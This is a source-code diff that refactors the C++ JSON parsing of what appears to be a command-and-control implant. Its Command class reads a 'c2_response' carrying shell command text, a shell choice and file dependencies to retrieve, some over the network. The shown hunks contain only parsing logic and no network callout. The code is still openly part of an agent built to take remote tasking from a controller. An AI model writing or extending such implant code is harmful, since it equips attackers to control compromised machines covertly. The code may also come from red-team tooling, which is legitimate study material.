@@ -4,19 +4,18 @@
 #include <experimental/filesystem>
 #include <future>
 #include <iostream>
+#include <json.hpp>
 #include <memory>
 #include <string>
 #include <vector>
 
 #include "installer.hh"
-#include "rapidjson/document.h"
-#include "rapidjson/stringbuffer.h"
-#include "rapidjson/writer.h"
 #include "request.hh"
 #include "sysinfo.hh"
 #include "util.hh"
 
 namespace fs = std::experimental::filesystem;
+using json = nlohmann::json;
 
 bool LocalFileDep::Retrieve() {
     if (name.empty() or path.empty()) return false;
@@ -48,22 +47,27 @@ bool NetworkFileDep::Retrieve() {
 
 Command::Command(const std::string& c2_response) {
     // Parse into something resembling a nested unordered map
-    rapidjson::Document json;
-    json.Parse(c2_response.c_str());
+    //
+    json res_json;
+
+    try {
+        res_json = json::parse(c2_response.c_str());
+    } catch (...) {
+        res_json.clear();
+    }
 
     /* Will essentially do nothing if a proper JSON response is not sent.
      * Shell will be set to default and the command text will remain empty.
      */
-    if (json.IsObject()) {
-        command_text = json["command_text"].IsString()
-                           ? json["command_text"].GetString()
+    if (res_json.is_object()) {
+        command_text = res_json["command_text"].is_string()
+                           ? res_json["command_text"]
                            : "";
-        shell =
-            json["shell"].IsString() ? json["shell"].GetString() : "default";
+        shell = res_json["shell"].is_string() ? res_json["shell"] : "default";
 
         // Ensure "files" value is an array of JSON objects
-        const rapidjson::Value& dep_files = json["files"];
-        if (dep_files.IsArray()) {
+        const json& dep_files = res_json["files"];
+        if (dep_files.is_array()) {
             ParseFileDeps_(dep_files);
         }
     } else {
@@ -71,20 +75,17 @@ Command::Command(const std::string& c2_response) {
     }
 }
 
-void Command::ParseFileDeps_(const rapidjson::Value& deps) {
+void Command::ParseFileDeps_(const json& deps) {
     /* Loop through array of JSON objects, validating along the way. Invalid
      * strings for file name, path, or type will default to empty strings. These
      * invalid files should be ignored. */
-    int size = deps.Size();
+    int size = deps.size();
     for (int i = 0; i < size; ++i) {
-        const rapidjson::Value& file = deps[i];
-        if (file.IsObject()) {
-            std::string name =
-                file["name"].IsString() ? file["name"].GetString() : "";
-            std::string path =
-                file["path"].IsString() ? file["path"].GetString() : "";
-            std::string type =
-                file["type"].IsString() ? file["type"].GetString() : "";
+        const json& file = deps[i];
+        if (file.is_object()) {
+            std::string name = file["name"].is_string() ? file["name"] : "";
+            std::string path = file["path"].is_string() ? file["path"] : "";
+            std::string type = file["type"].is_string() ? file["type"] : "";
 
             if (not(name.empty() or path.empty() or type.empty())) {
                 // Determine dependency type and add to vector
